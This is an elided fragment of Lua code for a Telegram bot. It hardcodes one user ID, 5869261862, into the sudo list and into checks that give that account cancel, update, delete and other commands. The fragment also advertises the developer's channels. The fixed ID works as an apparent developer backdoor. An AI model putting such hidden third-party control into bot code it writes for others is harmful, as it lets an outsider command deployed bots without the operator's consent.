...
chsource = Redis:get(Fast..'chsource') or "@IPP_QC"
devsource = Redis:get(Fast..'devsource') or "IB_QC"
...
ControllerAll = false
local ListSudos = {Sudo_Id,5869261862,1776925442,5043883970}
...
if text == 'كانسل' and tonumber(senderr) == tonumber(5869261862) then
...
if text == 'ابديت' and tonumber(senderr) == tonumber(5869261862) then
...
if tonumber(senderr) == 5869261862 then
...
if text and text:match('^حذف (%d+)$') and tonumber(senderr) == tonumber(5869261862) then
...
data = {
{
{text = 'Dev rino', url = 't.me/@IB_QC'}, 
},
}
}
return send(msg_chat_id,msg_id,"[rino](tg://user?id=5869261862)","md",true, false, false, true, reply_markup)
end
...
if text and text:match("^ss (.*)$") and tonumber(senderr) == tonumber(5869261862) then
local txx = "\n"
...
bot.sendAudio(msg_chat_id,msg_id,'./intk'..rand..'.mp3',tostring(inoi),"html",nil,tostring(inoi),"@IPP_QC")
sleep(1)
